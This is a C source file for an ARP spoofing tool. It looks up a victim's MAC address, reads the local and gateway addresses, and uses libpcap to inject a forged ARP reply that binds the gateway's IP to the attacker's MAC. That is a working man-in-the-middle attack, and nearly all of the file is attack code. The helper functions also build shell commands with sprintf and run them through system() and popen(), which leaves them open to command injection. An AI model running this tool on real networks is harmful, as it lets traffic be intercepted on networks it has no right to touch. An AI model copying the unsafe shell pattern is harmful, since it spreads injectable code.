#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h> 
#include <pcap.h>
#include <netinet/ether.h>
#include <arpa/inet.h>

void getMyAddress(const char *dev, struct in_addr *attacker_IP, struct ether_addr *attacker_MAC);
void getGatewayIP(const char *dev, struct in_addr *gateway_IP);
void spoofing(pcap_t *pcd, const struct in_addr victim_IP, const struct ether_addr victim_MAC,
	const struct in_addr sending_IP, const struct ether_addr sending_MAC);

int main(int argc, char **argv)
{
	FILE* fp;

	pcap_t *pcd;
	char *dev;

	struct in_addr      attacker_IP, victim_IP, gateway_IP;
	struct ether_addr   attacker_MAC, victim_MAC;

	char errbuf[PCAP_ERRBUF_SIZE];
	char cmd[256] = { 0x0 };
	char IPbuf[20] = { 0x0 };
	char MACbuf[20] = { 0x0 };

	dev = pcap_lookupdev(errbuf);
	
	if (dev == NULL)
	{
		printf("%s\n", errbuf);
		exit(1);
	}
	printf("1\n");

	pcd = pcap_open_live(dev, BUFSIZ, 1, -1, errbuf);

	if (pcd == NULL)
	{
		printf("%s\n", errbuf);
		exit(1);
	}
	printf("2\n");

	if (inet_aton(argv[1], &victim_IP) == 0)
	{
		printf("not proper ip\n");
		exit(1);
	}

	printf("error check finish\n");

	// IPv4 dotted decimal
	inet_ntop(AF_INET, &victim_IP, IPbuf, sizeof(IPbuf)); 

	//get MAC address
	sprintf(cmd, "ping -c 1 %s > /dev/null", IPbuf);
	system(cmd);
	sprintf(cmd, "arp | grep '%s' | grep '%s' | awk '{print $3}'", dev, IPbuf);
	fp = popen(cmd, "r");
	fgets(MACbuf, sizeof(MACbuf), fp);
	pclose(fp);
	ether_aton_r(MACbuf, &victim_MAC);

	// get information
	getMyAddress(dev, &attacker_IP, &attacker_MAC);
	getGatewayIP(dev, &gateway_IP);

	printf("got all information\n\n");

	// arp spoofing
	spoofing(pcd, victim_IP, victim_MAC, gateway_IP, attacker_MAC);

	printf("spoofing successed\n");

	return 0;
}


void getMyAddress(const char *dev, struct in_addr *attacker_IP, struct ether_addr *attacker_MAC)
{
	FILE* fp;
	char cmd[256] = { 0x0 };
	char MACbuf[20] = { 0x0 }, IPbuf[20] = { 0x0 };

	// MAC    
	sprintf(cmd, "ifconfig | grep '%s' | awk '{print $5}'", dev);
	fp = popen(cmd, "r");
	fgets(MACbuf, sizeof(MACbuf), fp);
	pclose(fp);
	ether_aton_r(MACbuf, attacker_MAC);

	// IP
	sprintf(cmd, "ifconfig | grep -A 1 '%s' | grep 'inet addr' | awk '{print $2}' | awk -F':' '{print $2}'", dev);
	fp = popen(cmd, "r");
	fgets(IPbuf, sizeof(IPbuf), fp);
	pclose(fp);
	inet_aton(IPbuf, attacker_IP);

	return;
}




void getGatewayIP(const char *dev, struct in_addr *gateway_IP)
{
	FILE* fp;
	char cmd[256] = { 0x0 };
	char IPbuf[20] = { 0x0 };
	
	// Gateway
	sprintf(cmd, "route -n | grep '%s'  | grep 'UG' | awk '{print $2}'", dev);

	fp = popen(cmd, "r");
	fgets(IPbuf, sizeof(IPbuf), fp);
	pclose(fp);

	inet_aton(IPbuf, gateway_IP);

	return;
}



void spoofing(pcap_t *pcd, const struct in_addr victim_IP, const struct ether_addr victim_MAC,
	const struct in_addr sending_IP, const struct ether_addr sending_MAC)
{
	const int ETHER_LEN = sizeof(struct ether_header);
	const int ARP_LEN = sizeof(struct ether_arp);
	u_char packet[ETHER_LEN + ARP_LEN];
	struct ether_header etherHdr;
	struct ether_arp arpHdr;

	// Ethernet part
	etherHdr.ether_type = htons(ETHERTYPE_ARP);
	memcpy(etherHdr.ether_dhost, &victim_MAC.ether_addr_octet, ETHER_ADDR_LEN);
	memcpy(etherHdr.ether_shost, &sending_MAC.ether_addr_octet, ETHER_ADDR_LEN);

	// ARP part
	arpHdr.arp_hrd = htons(ARPHRD_ETHER);
	arpHdr.arp_pro = htons(ETHERTYPE_IP);
	arpHdr.arp_hln = ETHER_ADDR_LEN;
	arpHdr.arp_pln = sizeof(in_addr_t);
	arpHdr.arp_op = htons(ARPOP_REPLY);
	memcpy(&arpHdr.arp_sha, &sending_MAC.ether_addr_octet, ETHER_ADDR_LEN);
	memcpy(&arpHdr.arp_spa, &sending_IP.s_addr, sizeof(in_addr_t));
	memcpy(&arpHdr.arp_tha, &victim_MAC.ether_addr_octet, ETHER_ADDR_LEN);
	memcpy(&arpHdr.arp_tpa, &victim_IP.s_addr, sizeof(in_addr_t));

	// add Ethernet + ARP
	memcpy(packet, &etherHdr, ETHER_LEN);
	memcpy(packet + ETHER_LEN, &arpHdr, ARP_LEN);

	// send
	pcap_inject(pcd, packet, sizeof(packet));
	
	return;
}
